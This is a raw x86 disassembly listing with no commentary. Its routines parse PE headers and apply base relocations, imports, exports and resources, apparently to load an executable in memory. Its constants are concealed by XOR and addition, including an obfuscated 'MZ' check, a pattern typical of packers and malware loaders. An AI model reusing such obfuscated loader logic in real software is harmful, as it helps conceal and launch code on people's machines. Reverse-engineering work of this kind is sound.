  417de3:	cmp    edx,DWORD PTR [ecx+0xa4]
  417de9:	jae    0x417dfc
  417deb:	add    eax,DWORD PTR [ebp-0xc]
  417dee:	mov    edx,DWORD PTR [eax+0x4]
  417df1:	mov    DWORD PTR [ebp-0xc],edx
  417df4:	test   edx,edx
  417df6:	jne    0x417d74
  417dfc:	mov    eax,DWORD PTR [ebp-0x10]
  417dff:	mov    DWORD PTR [ebp-0x6c],eax
  417e02:	mov    DWORD PTR [ebp-0x70],0x4
  417e09:	mov    eax,DWORD PTR [ecx+0x50]
  417e0c:	mov    DWORD PTR [ebp-0x68],eax
  417e0f:	mov    eax,DWORD PTR [ebp-0x1c]
  417e12:	xor    eax,esi
  417e14:	add    eax,edi
  417e16:	mov    DWORD PTR [ebp-0x64],eax
  417e19:	lea    eax,[ebp-0x20]
  417e1c:	mov    DWORD PTR [ebp-0x60],eax
  417e1f:	lea    eax,[ebp-0x70]
  417e22:	push   eax
  417e23:	mov    eax,DWORD PTR [ebp+0x8]
  417e26:	xor    eax,esi
  417e28:	add    eax,edi
  417e2a:	push   eax
  417e2b:	mov    eax,DWORD PTR [ebp+0x20]
  417e2e:	add    eax,0xee
  417e33:	push   eax
  417e34:	mov    eax,DWORD PTR [ebp+0x20]
  417e37:	mov    eax,DWORD PTR [eax+0x198]
  417e3d:	push   DWORD PTR [eax]
  417e3f:	mov    eax,DWORD PTR [ebp+0x10]
  417e42:	call   eax
  417e44:	mov    eax,DWORD PTR [ebp+0x20]
  417e47:	mov    eax,DWORD PTR [eax+0x180]
  417e4d:	add    eax,DWORD PTR [ebp+0xc]
  417e50:	mov    ecx,DWORD PTR [ebp+0xc]
  417e53:	push   DWORD PTR [ebp+0x18]
  417e56:	mov    DWORD PTR [eax],ecx
  417e58:	push   DWORD PTR [ebp+0x14]
  417e5b:	push   DWORD PTR [ebp+0x1c]
  417e5e:	call   ebx
  417e60:	mov    ecx,DWORD PTR [ebp+0xc]
  417e63:	add    ecx,DWORD PTR [ebp+0x20]
  417e66:	lea    eax,[ebp+0x4]
  417e69:	mov    DWORD PTR [ebp+0x20],ecx
  417e6c:	mov    ecx,DWORD PTR [ebp+0x20]
  417e6f:	mov    ecx,DWORD PTR [ebp+0x20]
  417e72:	mov    edx,DWORD PTR [ecx+0x190]
  417e78:	mov    ecx,DWORD PTR [ebp+0x20]
  417e7b:	mov    ecx,DWORD PTR [ecx+0x18c]
  417e81:	mov    esi,DWORD PTR [ecx]
  417e83:	cmp    DWORD PTR [eax],esi
  417e85:	jb     0x417ea6
  417e87:	mov    esi,DWORD PTR [edx]
  417e89:	mov    edi,DWORD PTR [edx]
  417e8b:	mov    esi,DWORD PTR [esi+0x3c]
  417e8e:	lea    esi,[edi+esi*1+0x50]
  417e92:	mov    edi,DWORD PTR [ecx]
  417e94:	add    edi,DWORD PTR [esi]
  417e96:	cmp    DWORD PTR [eax],edi
  417e98:	jae    0x417ea6
  417e9a:	mov    esi,DWORD PTR [ecx]
  417e9c:	mov    ecx,DWORD PTR [eax]
  417e9e:	mov    edx,DWORD PTR [edx]
  417ea0:	sub    ecx,esi
  417ea2:	add    edx,ecx
  417ea4:	mov    DWORD PTR [eax],edx
  417ea6:	mov    eax,DWORD PTR [ebp+0xc]
  417ea9:	jmp    0x417ead
  417eab:	xor    eax,eax
  417ead:	pop    edi
  417eae:	pop    esi
  417eaf:	pop    ebx
  417eb0:	leave  
  417eb1:	ret    0x1c
  417eb4:	push   ebp
  417eb5:	mov    ebp,esp
  417eb7:	sub    esp,0x1c
  417eba:	push   esi
  417ebb:	mov    esi,eax
  417ebd:	mov    eax,DWORD PTR [ecx+0x190]
  417ec3:	cmp    DWORD PTR [eax],0x0
  417ec6:	je     0x417fd6
  417ecc:	test   edx,edx
  417ece:	je     0x417fd6
  417ed4:	test   esi,esi
  417ed6:	je     0x417fd6
  417edc:	mov    eax,DWORD PTR [esi+0x88]
  417ee2:	test   eax,eax
  417ee4:	je     0x417fd1
  417eea:	cmp    DWORD PTR [esi+0x8c],0x10
  417ef1:	je     0x417fd1
  417ef7:	cmp    DWORD PTR [esi+0x34],edx
  417efa:	je     0x417fd1
  417f00:	mov    esi,DWORD PTR [ecx+0x18c]
  417f06:	and    DWORD PTR [ebp-0x10],0x0
  417f0a:	mov    ecx,edx
  417f0c:	sub    ecx,DWORD PTR [esi]
  417f0e:	add    eax,edx
  417f10:	movzx  edx,WORD PTR [eax+0xc]
  417f14:	mov    DWORD PTR [ebp-0x1c],ecx
  417f17:	movzx  ecx,WORD PTR [eax+0xe]
  417f1b:	add    ecx,edx
  417f1d:	je     0x417fd1
  417f23:	lea    ecx,[eax+0x14]
  417f26:	push   ebx
  417f27:	mov    DWORD PTR [ebp-0x18],ecx
  417f2a:	mov    esi,0x7fffffff
  417f2f:	push   edi
  417f30:	test   DWORD PTR [ecx],esi
  417f32:	je     0x417fb3
  417f34:	mov    edx,DWORD PTR [ecx]
  417f36:	and    DWORD PTR [ebp-0xc],0x0
  417f3a:	and    edx,esi
  417f3c:	add    edx,eax
  417f3e:	movzx  edi,WORD PTR [edx+0xe]
  417f42:	movzx  ebx,WORD PTR [edx+0xc]
  417f46:	add    edi,ebx
  417f48:	je     0x417fb3
  417f4a:	lea    ecx,[edx+0x14]
  417f4d:	mov    DWORD PTR [ebp-0x14],ecx
  417f50:	test   DWORD PTR [ecx],esi
  417f52:	je     0x417f95
  417f54:	mov    ecx,DWORD PTR [ecx]
  417f56:	and    DWORD PTR [ebp-0x8],0x0
  417f5a:	and    ecx,esi
  417f5c:	add    ecx,eax
  417f5e:	movzx  edi,WORD PTR [ecx+0xe]
  417f62:	movzx  ebx,WORD PTR [ecx+0xc]
  417f66:	add    edi,ebx
  417f68:	je     0x417f95
  417f6a:	lea    edi,[ecx+0x14]
  417f6d:	mov    DWORD PTR [ebp-0x4],edi
  417f70:	mov    edi,DWORD PTR [ebp-0x4]
  417f73:	mov    edi,DWORD PTR [edi]
  417f75:	test   edi,edi
  417f77:	je     0x417f7f
  417f79:	mov    ebx,DWORD PTR [ebp-0x1c]
  417f7c:	add    DWORD PTR [edi+eax*1],ebx
  417f7f:	movzx  edi,WORD PTR [ecx+0xe]
  417f83:	movzx  ebx,WORD PTR [ecx+0xc]
  417f87:	inc    DWORD PTR [ebp-0x8]
  417f8a:	add    DWORD PTR [ebp-0x4],0x8
  417f8e:	add    edi,ebx
  417f90:	cmp    DWORD PTR [ebp-0x8],edi
  417f93:	jb     0x417f70
  417f95:	movzx  edi,WORD PTR [edx+0xe]
  417f99:	movzx  ebx,WORD PTR [edx+0xc]
  417f9d:	mov    ecx,DWORD PTR [ebp-0x14]
  417fa0:	inc    DWORD PTR [ebp-0xc]
  417fa3:	add    ecx,0x8
  417fa6:	add    edi,ebx
  417fa8:	mov    DWORD PTR [ebp-0x14],ecx
  417fab:	cmp    DWORD PTR [ebp-0xc],edi
  417fae:	jb     0x417f50
  417fb0:	mov    ecx,DWORD PTR [ebp-0x18]
  417fb3:	movzx  edx,WORD PTR [eax+0xe]
  417fb7:	movzx  edi,WORD PTR [eax+0xc]
  417fbb:	inc    DWORD PTR [ebp-0x10]
  417fbe:	add    ecx,0x8
  417fc1:	add    edx,edi
  417fc3:	mov    DWORD PTR [ebp-0x18],ecx
  417fc6:	cmp    DWORD PTR [ebp-0x10],edx
  417fc9:	jb     0x417f30
  417fcf:	pop    edi
  417fd0:	pop    ebx
  417fd1:	xor    eax,eax
  417fd3:	inc    eax
  417fd4:	jmp    0x417fd8
  417fd6:	xor    eax,eax
  417fd8:	pop    esi
  417fd9:	leave  
  417fda:	ret    
  417fdb:	push   ebp
  417fdc:	mov    ebp,esp
  417fde:	mov    ecx,DWORD PTR [ecx+0x190]
  417fe4:	mov    eax,DWORD PTR [ebp+0xc]
  417fe7:	sub    esp,0x10
  417fea:	push   ebx
  417feb:	xor    ebx,ebx
  417fed:	push   esi
  417fee:	push   edi
  417fef:	cmp    DWORD PTR [ecx],ebx
  417ff1:	je     0x418079
  417ff7:	cmp    eax,ebx
  417ff9:	je     0x418079
  417ffb:	cmp    DWORD PTR [eax+0x78],ebx
  417ffe:	jne    0x418005
  418000:	xor    eax,eax
  418002:	inc    eax
  418003:	jmp    0x41807b
  418005:	mov    eax,DWORD PTR [eax+0x78]
  418008:	add    eax,DWORD PTR [ebp+0x8]
  41800b:	mov    ecx,DWORD PTR [eax+0x1c]
  41800e:	mov    edx,DWORD PTR [eax+0x24]
  418011:	mov    esi,DWORD PTR [eax+0x14]
  418014:	mov    edi,DWORD PTR [eax+0x18]
  418017:	add    ecx,DWORD PTR [ebp+0x8]
  41801a:	add    edx,DWORD PTR [ebp+0x8]
  41801d:	mov    DWORD PTR [ebp-0x4],esi
  418020:	cmp    esi,edi
  418022:	ja     0x418027
  418024:	mov    DWORD PTR [ebp-0x4],edi
  418027:	mov    DWORD PTR [ebp-0x8],ebx
  41802a:	cmp    DWORD PTR [ebp-0x4],ebx
  41802d:	jbe    0x418000
  41802f:	cmp    ebx,DWORD PTR [eax+0x14]
  418032:	jae    0x41803a
  418034:	movzx  esi,WORD PTR [edx+ebx*2]
  418038:	jmp    0x41803c
  41803a:	mov    esi,ebx
  41803c:	lea    esi,[ecx+esi*4]
  41803f:	mov    edi,DWORD PTR [esi]
  418041:	test   edi,edi
  418043:	je     0x41806e
  418045:	add    edi,DWORD PTR [ebp+0x8]
  418048:	mov    DWORD PTR [ebp-0x10],edi
  41804b:	cmp    edi,eax
  41804d:	jbe    0x41805f
  41804f:	mov    ebx,DWORD PTR [ebp+0xc]
  418052:	mov    ebx,DWORD PTR [ebx+0x7c]
  418055:	add    ebx,eax
  418057:	cmp    edi,ebx
  418059:	jae    0x41805f
  41805b:	mov    esi,DWORD PTR [esi]
  41805d:	jmp    0x418067
  41805f:	sub    edi,DWORD PTR [ebp+0x8]
  418062:	mov    DWORD PTR [esi],edi
  418064:	mov    esi,DWORD PTR [ebp-0x10]
  418067:	test   esi,esi
  418069:	je     0x418079
  41806b:	mov    ebx,DWORD PTR [ebp-0x8]
  41806e:	inc    ebx
  41806f:	mov    DWORD PTR [ebp-0x8],ebx
  418072:	cmp    ebx,DWORD PTR [ebp-0x4]
  418075:	jb     0x41802f
  418077:	jmp    0x418000
  418079:	xor    eax,eax
  41807b:	pop    edi
  41807c:	pop    esi
  41807d:	pop    ebx
  41807e:	leave  
  41807f:	ret    0x8
  418082:	push   ebp
  418083:	mov    ebp,esp
  418085:	sub    esp,0x2c
  418088:	mov    edx,0xf89c8585
  41808d:	mov    DWORD PTR [ebp-0x4],edx
  418090:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418097:	mov    eax,DWORD PTR [ebp-0x4]
  41809a:	mov    ecx,DWORD PTR [ebp-0x4]
  41809d:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a9:	push   ebx
  4180aa:	mov    ebx,DWORD PTR [ebp+0x10]
  4180ad:	push   esi
  4180ae:	mov    esi,0x751089b
  4180b3:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4180ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4180bd:	mov    ebx,DWORD PTR [ebx+0x190]
  4180c3:	push   edi
  4180c4:	mov    edi,0x3272e2
  4180c9:	xor    ecx,esi
  4180cb:	xor    eax,esi
  4180cd:	add    eax,edi
  4180cf:	add    ecx,edi
  4180d1:	mov    DWORD PTR [ebp-0x18],eax
  4180d4:	cmp    ecx,DWORD PTR [ebx]
  4180d6:	je     0x418357
  4180dc:	mov    ebx,DWORD PTR [ebp-0x4]
  4180df:	mov    ecx,DWORD PTR [ebp+0xc]
  4180e2:	xor    ebx,esi
  4180e4:	add    ebx,edi
  4180e6:	cmp    ebx,ecx
  4180e8:	je     0x418357
  4180ee:	mov    ebx,DWORD PTR [ebp-0x4]
  4180f1:	mov    ecx,DWORD PTR [ecx+0x80]
  4180f7:	xor    ebx,esi
  4180f9:	add    ebx,edi
  4180fb:	cmp    ecx,ebx
  4180fd:	je     0x418352
  418103:	add    ecx,DWORD PTR [ebp+0x8]
  418106:	mov    DWORD PTR [ebp-0x2c],ecx
  418109:	mov    ebx,edx
  41810b:	xor    ebx,esi
  41810d:	add    ebx,edi
  41810f:	mov    DWORD PTR [ebp-0x10],ebx
  418112:	mov    ebx,DWORD PTR [ebp-0x10]
  418115:	cmp    ebx,edx
  418117:	je     0x41812b
  418119:	mov    edx,DWORD PTR [ebp-0x10]
  41811c:	mov    ebx,DWORD PTR [ebp-0x4]
  41811f:	imul   edx,edx,0x14
  418122:	xor    ebx,esi
  418124:	add    ebx,edi
  418126:	cmp    DWORD PTR [edx+ecx*1],ebx
  418129:	jne    0x418142
  41812b:	mov    edx,DWORD PTR [ebp-0x10]
  41812e:	mov    ebx,DWORD PTR [ebp-0x4]
  418131:	imul   edx,edx,0x14
  418134:	xor    ebx,esi
  418136:	add    ebx,edi
  418138:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41813c:	je     0x418344
  418142:	mov    eax,DWORD PTR [ebp-0x4]
  418145:	mov    ebx,DWORD PTR [ebp-0x4]
  418148:	mov    eax,DWORD PTR [ebp-0x10]
  41814b:	imul   eax,eax,0x14
  41814e:	add    eax,ecx
  418150:	mov    ecx,DWORD PTR [eax+0x10]
  418153:	add    ecx,DWORD PTR [ebp+0x8]
  418156:	xor    ebx,esi
  418158:	mov    DWORD PTR [ebp-0x1c],ecx
  41815b:	mov    ecx,DWORD PTR [ebp-0x4]
  41815e:	mov    edx,DWORD PTR [ebp-0x4]
  418161:	xor    ecx,esi
  418163:	add    ecx,edi
  418165:	xor    edx,esi
  418167:	mov    DWORD PTR [ebp-0x24],ecx
  41816a:	mov    ecx,DWORD PTR [eax]
  41816c:	add    edx,edi
  41816e:	add    ebx,edi
  418170:	cmp    ecx,edx
  418172:	je     0x41817a
  418174:	add    ecx,DWORD PTR [ebp+0x8]
  418177:	mov    DWORD PTR [ebp-0x24],ecx
  41817a:	mov    ecx,DWORD PTR [ebp-0x4]
  41817d:	xor    ecx,esi
  41817f:	add    ecx,DWORD PTR [eax+0xc]
  418182:	mov    eax,DWORD PTR [ebp+0x8]
  418185:	lea    eax,[ecx+eax*1+0x3272e2]
  41818c:	mov    DWORD PTR [ebp+0xc],eax
  41818f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  418196:	mov    eax,DWORD PTR [ebp+0x10]
  418199:	push   DWORD PTR [ebp+0xc]
  41819c:	mov    eax,DWORD PTR [eax+0x1d8]
  4181a2:	call   DWORD PTR [eax]
  4181a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4181a7:	xor    ecx,esi
  4181a9:	add    ecx,edi
  4181ab:	mov    DWORD PTR [ebp-0xc],eax
  4181ae:	cmp    ecx,eax
  4181b0:	jne    0x4181c4
  4181b2:	mov    eax,DWORD PTR [ebp+0x10]
  4181b5:	push   DWORD PTR [ebp+0xc]
  4181b8:	mov    eax,DWORD PTR [eax+0x1d8]
  4181be:	call   DWORD PTR [eax+0xc]
  4181c1:	mov    DWORD PTR [ebp-0xc],eax
  4181c4:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  4181cb:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  4181d2:	mov    eax,DWORD PTR [ebp-0x4]
  4181d5:	xor    eax,esi
  4181d7:	add    eax,edi
  4181d9:	cmp    eax,DWORD PTR [ebp-0xc]
  4181dc:	jne    0x418201
  4181de:	mov    eax,DWORD PTR [ebp-0x8]
  4181e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4181e4:	xor    eax,esi
  4181e6:	xor    ecx,esi
  4181e8:	lea    ebx,[ebx+eax*1+0x3272e2]
  4181ef:	mov    eax,DWORD PTR [ebp+0x10]
  4181f2:	mov    eax,DWORD PTR [eax+0x1d8]
  4181f8:	add    ecx,edi
  4181fa:	imul   ecx,ebx
  4181fd:	push   ecx
  4181fe:	call   DWORD PTR [eax+0x24]
  418201:	mov    eax,DWORD PTR [ebp-0x4]
  418204:	xor    eax,esi
  418206:	add    eax,edi
  418208:	cmp    eax,DWORD PTR [ebp-0xc]
  41820b:	jne    0x41821c
  41820d:	mov    eax,DWORD PTR [ebp-0x28]
  418210:	xor    eax,esi
  418212:	add    eax,edi
  418214:	cmp    ebx,eax
  418216:	jbe    0x418196
  41821c:	mov    eax,DWORD PTR [ebp-0x4]
  41821f:	xor    eax,esi
  418221:	add    eax,edi
  418223:	cmp    eax,DWORD PTR [ebp-0xc]
  418226:	jne    0x41823f
  418228:	mov    eax,DWORD PTR [ebp-0x8]
  41822b:	mov    ecx,DWORD PTR [ebp-0x18]
  41822e:	xor    eax,esi
  418230:	lea    eax,[ecx+eax*1+0x3272e2]
  418237:	mov    DWORD PTR [ebp-0x18],eax
  41823a:	jmp    0x41832e
  41823f:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  418246:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41824d:	mov    ebx,DWORD PTR [ebp-0x4]
  418250:	xor    ebx,esi
  418252:	add    ebx,edi
  418254:	jmp    0x41831b
  418259:	mov    eax,DWORD PTR [ebp-0x4]
  41825c:	xor    eax,esi
  41825e:	add    eax,edi
  418260:	mov    DWORD PTR [ebp-0x14],eax
  418263:	mov    eax,DWORD PTR [ebp-0x4]
  418266:	xor    eax,esi
  418268:	add    eax,edi
  41826a:	mov    DWORD PTR [ebp+0xc],eax
  41826d:	mov    ecx,DWORD PTR [ebp-0x4]
  418270:	mov    eax,DWORD PTR [ebp-0x24]
  418273:	xor    ecx,esi
  418275:	add    ecx,edi
  418277:	cmp    ecx,eax
  418279:	je     0x418281
  41827b:	mov    eax,DWORD PTR [eax+ebx*4]
  41827e:	mov    DWORD PTR [ebp-0x14],eax
  418281:	mov    eax,DWORD PTR [ebp-0x1c]
  418284:	mov    eax,DWORD PTR [eax+ebx*4]
  418287:	mov    DWORD PTR [ebp+0xc],eax
  41828a:	mov    eax,DWORD PTR [ebp-0x4]
  41828d:	mov    ecx,DWORD PTR [ebp-0x14]
  418290:	xor    eax,esi
  418292:	add    eax,edi
  418294:	cmp    eax,ecx
  418296:	je     0x4182c1
  418298:	mov    eax,DWORD PTR [ebp-0x4]
  41829b:	mov    ecx,DWORD PTR [ebp-0x14]
  41829e:	xor    eax,esi
  4182a0:	add    eax,edi
  4182a2:	shr    ecx,0x1f
  4182a5:	cmp    eax,ecx
  4182a7:	je     0x4182c1
  4182a9:	mov    ecx,DWORD PTR [ebp-0x14]
  4182ac:	mov    eax,DWORD PTR [ebp+0x10]
  4182af:	mov    eax,DWORD PTR [eax+0x1d8]
  4182b5:	movzx  ecx,cx
  4182b8:	push   ecx
  4182b9:	push   DWORD PTR [ebp-0xc]
  4182bc:	call   DWORD PTR [eax+0x8]
  4182bf:	jmp    0x4182da
  4182c1:	mov    eax,DWORD PTR [ebp+0xc]
  4182c4:	add    eax,DWORD PTR [ebp+0x8]
  4182c7:	mov    ecx,DWORD PTR [ebp+0x10]
  4182ca:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4182d0:	add    eax,0x2
  4182d3:	push   eax
  4182d4:	push   DWORD PTR [ebp-0xc]
  4182d7:	call   DWORD PTR [ecx+0x8]
  4182da:	mov    DWORD PTR [ebp+0xc],eax
  4182dd:	mov    eax,DWORD PTR [ebp-0x4]
  4182e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4182e3:	xor    eax,esi
  4182e5:	add    eax,edi
  4182e7:	cmp    eax,ecx
  4182e9:	mov    eax,DWORD PTR [ebp-0x8]
  4182ec:	jne    0x4182ff
  4182ee:	mov    ecx,DWORD PTR [ebp-0x18]
  4182f1:	xor    eax,esi
  4182f3:	lea    eax,[ecx+eax*1+0x3272e2]
  4182fa:	mov    DWORD PTR [ebp-0x18],eax
  4182fd:	jmp    0x41830f
  4182ff:	mov    ecx,DWORD PTR [ebp+0xc]
  418302:	xor    eax,esi
  418304:	add    eax,edi
  418306:	imul   eax,ecx
  418309:	mov    ecx,DWORD PTR [ebp-0x1c]
  41830c:	mov    DWORD PTR [ecx+ebx*4],eax
  41830f:	mov    eax,DWORD PTR [ebp-0x8]
  418312:	xor    eax,esi
  418314:	lea    ebx,[ebx+eax*1+0x3272e2]
  41831b:	mov    eax,DWORD PTR [ebp-0x4]
  41831e:	mov    ecx,DWORD PTR [ebp-0x1c]
  418321:	xor    eax,esi
  418323:	add    eax,edi
  418325:	cmp    DWORD PTR [ecx+ebx*4],eax
  418328:	jne    0x418259
  41832e:	mov    edx,DWORD PTR [ebp-0x10]
  418331:	mov    eax,DWORD PTR [ebp-0x18]
  418334:	mov    ecx,DWORD PTR [ebp-0x2c]
  418337:	sub    edx,0x3272e1
  41833d:	xor    edx,esi
  41833f:	jmp    0x418109
  418344:	mov    ecx,DWORD PTR [ebp-0x4]
  418347:	xor    ecx,esi
  418349:	add    ecx,edi
  41834b:	cmp    eax,ecx
  41834d:	mov    eax,DWORD PTR [ebp-0x4]
  418350:	jne    0x41835a
  418352:	mov    eax,DWORD PTR [ebp-0x8]
  418355:	jmp    0x41835a
  418357:	mov    eax,DWORD PTR [ebp-0x4]
  41835a:	xor    eax,esi
  41835c:	add    eax,edi
  41835e:	pop    edi
  41835f:	pop    esi
  418360:	pop    ebx
  418361:	leave  
  418362:	ret    0xc
  418365:	push   ebp
  418366:	mov    ebp,esp
  418368:	sub    esp,0x28
  41836b:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418372:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  418379:	mov    eax,DWORD PTR [ebp+0xc]
  41837c:	mov    DWORD PTR [ebp+0xc],eax
  41837f:	push   esi
  418380:	mov    eax,eax
  418382:	mov    eax,DWORD PTR [ebp-0x4]
  418385:	mov    esi,DWORD PTR [ebp+0x8]
  418388:	mov    ecx,0x751089b
  41838d:	xor    eax,ecx
  41838f:	mov    edx,0x3272e2
  418394:	add    eax,edx
  418396:	cmp    esi,eax
  418398:	je     0x4184bf
  41839e:	mov    eax,DWORD PTR [ebp+0x8]
  4183a1:	mov    esi,DWORD PTR [ebp+0x8]
  4183a4:	add    esi,DWORD PTR [eax+0x3c]
  4183a7:	push   edi
  4183a8:	mov    DWORD PTR [ebp+0xc],esi
  4183ab:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  4183b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4183b5:	mov    esi,DWORD PTR [ebp-0x4]
  4183b8:	mov    edi,DWORD PTR [ebp+0xc]
  4183bb:	xor    esi,ecx
  4183bd:	xor    eax,ecx
  4183bf:	add    esi,edx
  4183c1:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  4183c8:	je     0x4184b9
  4183ce:	mov    esi,DWORD PTR [ebp+0xc]
  4183d1:	mov    eax,DWORD PTR [ebp+0x8]
  4183d4:	add    eax,DWORD PTR [esi+0xa0]
  4183da:	mov    esi,DWORD PTR [ebp+0x8]
  4183dd:	mov    edi,DWORD PTR [ebp+0xc]
  4183e0:	sub    esi,DWORD PTR [edi+0x34]
  4183e3:	mov    edi,DWORD PTR [ebp-0x4]
  4183e6:	xor    edi,ecx
  4183e8:	add    edi,edx
  4183ea:	mov    DWORD PTR [ebp-0x24],esi
  4183ed:	cmp    esi,edi
  4183ef:	je     0x4184b9
  4183f5:	mov    esi,DWORD PTR [ebp-0x4]
  4183f8:	xor    esi,ecx
  4183fa:	add    esi,edx
  4183fc:	mov    DWORD PTR [ebp-0x8],esi
  4183ff:	push   ebx
  418400:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  418407:	jmp    0x4184a3
  41840c:	mov    esi,DWORD PTR [ebp-0x4]
  41840f:	xor    esi,ecx
  418411:	lea    edi,[ebx-0x8]
  418414:	add    esi,edx
  418416:	shr    edi,1
  418418:	cmp    esi,edi
  41841a:	jae    0x418489
  41841c:	sub    edi,esi
  41841e:	lea    ebx,[eax+esi*2+0x8]
  418422:	mov    DWORD PTR [ebp-0x18],edi
  418425:	movzx  esi,WORD PTR [ebx]
  418428:	and    esi,0xfff
  41842e:	mov    DWORD PTR [ebp-0x14],esi
  418431:	mov    edi,DWORD PTR [ebp-0x14]
  418434:	mov    esi,DWORD PTR [eax]
  418436:	sub    esi,edx
  418438:	add    edi,esi
  41843a:	movzx  esi,WORD PTR [ebx]
  41843d:	shr    esi,0xc
  418440:	xor    edi,ecx
  418442:	mov    DWORD PTR [ebp-0x20],edi
  418445:	mov    DWORD PTR [ebp-0x14],esi
  418448:	mov    esi,DWORD PTR [ebp-0x20]
  41844b:	mov    edi,DWORD PTR [ebp+0x8]
  41844e:	xor    esi,ecx
  418450:	lea    esi,[esi+edi*1+0x3272e2]
  418457:	mov    DWORD PTR [ebp-0x20],esi
  41845a:	mov    esi,DWORD PTR [ebp-0x10]
  41845d:	mov    edi,DWORD PTR [ebp-0x14]
  418460:	xor    esi,ecx
  418462:	add    esi,edx
  418464:	cmp    edi,esi
  418466:	jne    0x41847e
  418468:	mov    esi,DWORD PTR [ebp-0x10]
  41846b:	mov    edi,DWORD PTR [ebp-0x14]
  41846e:	xor    esi,ecx
  418470:	add    esi,edx
  418472:	cmp    edi,esi
  418474:	jne    0x41847e
  418476:	mov    esi,DWORD PTR [ebp-0x20]
  418479:	mov    edi,DWORD PTR [ebp-0x24]
  41847c:	add    DWORD PTR [esi],edi
  41847e:	add    ebx,0x2
  418481:	dec    DWORD PTR [ebp-0x18]
  418484:	jne    0x418425
  418486:	mov    ebx,DWORD PTR [ebp-0xc]
  418489:	add    DWORD PTR [ebp-0x8],ebx
  41848c:	mov    esi,DWORD PTR [ebp-0x1c]
  41848f:	mov    edi,DWORD PTR [ebp-0x8]
  418492:	mov    ebx,DWORD PTR [ebp+0xc]
  418495:	xor    esi,ecx
  418497:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41849e:	jae    0x4184b8
  4184a0:	add    eax,DWORD PTR [ebp-0xc]
  4184a3:	mov    esi,DWORD PTR [ebp-0x4]
  4184a6:	mov    ebx,DWORD PTR [eax+0x4]
  4184a9:	xor    esi,ecx
  4184ab:	add    esi,edx
  4184ad:	mov    DWORD PTR [ebp-0xc],ebx
  4184b0:	cmp    ebx,esi
  4184b2:	jne    0x41840c
  4184b8:	pop    ebx
  4184b9:	mov    eax,DWORD PTR [ebp-0x28]
  4184bc:	pop    edi
  4184bd:	jmp    0x4184c2
  4184bf:	mov    eax,DWORD PTR [ebp-0x4]
  4184c2:	xor    eax,ecx
  4184c4:	add    eax,edx
  4184c6:	pop    esi
  4184c7:	leave  
  4184c8:	ret    0x8
  4184cb:	push   ebp
  4184cc:	mov    ebp,esp
  4184ce:	sub    esp,0xcc
  4184d4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  4184db:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  4184e2:	mov    eax,DWORD PTR [ebp-0x4]
  4184e5:	push   ebx
  4184e6:	push   esi
  4184e7:	mov    esi,0x751089b
  4184ec:	xor    eax,esi
  4184ee:	push   edi
  4184ef:	mov    edi,0x3272e2
  4184f4:	add    eax,edi
  4184f6:	mov    DWORD PTR [ebp-0x1c],eax
  4184f9:	mov    eax,DWORD PTR [ebp-0x4]
  4184fc:	xor    eax,esi
  4184fe:	add    eax,edi
  418500:	mov    DWORD PTR [ebp-0x8],eax
  418503:	mov    ebx,DWORD PTR [ebp+0x20]
  418506:	mov    eax,DWORD PTR [ebp-0x14]
  418509:	mov    ecx,DWORD PTR [ebp-0x14]
  41850c:	xor    eax,ecx
  41850e:	mov    DWORD PTR [ebp-0x14],eax
  418511:	add    DWORD PTR [ebp-0x14],0xf89cb585
  418518:	mov    eax,DWORD PTR [ebp-0xc]
  41851b:	mov    ecx,DWORD PTR [ebp-0xc]
  41851e:	xor    eax,ecx
  418520:	mov    DWORD PTR [ebp-0xc],eax
  418523:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41852a:	mov    eax,DWORD PTR [ebp-0x10]
  41852d:	mov    ecx,DWORD PTR [ebp-0x10]
  418530:	xor    eax,ecx
  418532:	mov    DWORD PTR [ebp-0x10],eax
  418535:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41853c:	mov    eax,DWORD PTR [ebp-0x20]
  41853f:	mov    ecx,DWORD PTR [ebp-0x20]
  418542:	xor    eax,ecx
  418544:	mov    DWORD PTR [ebp-0x20],eax
  418547:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41854e:	mov    eax,0x9471
  418553:	mov    WORD PTR [ebp+0x20],ax
  418557:	mov    eax,DWORD PTR [ebp+0x8]
  41855a:	test   eax,eax
  41855c:	je     0x4189b7
  418562:	mov    eax,DWORD PTR [ebp+0xc]
  418565:	test   eax,eax
  418567:	je     0x4189b7
  41856d:	mov    eax,DWORD PTR [ebp+0x18]
  418570:	test   eax,eax
  418572:	je     0x4189b7
  418578:	mov    ax,WORD PTR [ebp+0x20]
  41857c:	mov    ecx,0x8a8d
  418581:	xor    ax,cx
  418584:	mov    ecx,0x3b51
  418589:	add    ax,cx
  41858c:	mov    ecx,DWORD PTR [ebp+0x8]
  41858f:	cmp    WORD PTR [ecx],ax
  418592:	jne    0x4189b7
  418598:	mov    eax,DWORD PTR [ebp-0x4]
  41859b:	xor    eax,esi
  41859d:	add    eax,edi
  41859f:	mov    DWORD PTR [ebp-0x30],eax
  4185a2:	mov    eax,DWORD PTR [ebp-0x4]
  4185a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4185a8:	mov    eax,DWORD PTR [ebp+0x8]
  4185ab:	add    eax,DWORD PTR [ecx+0x3c]
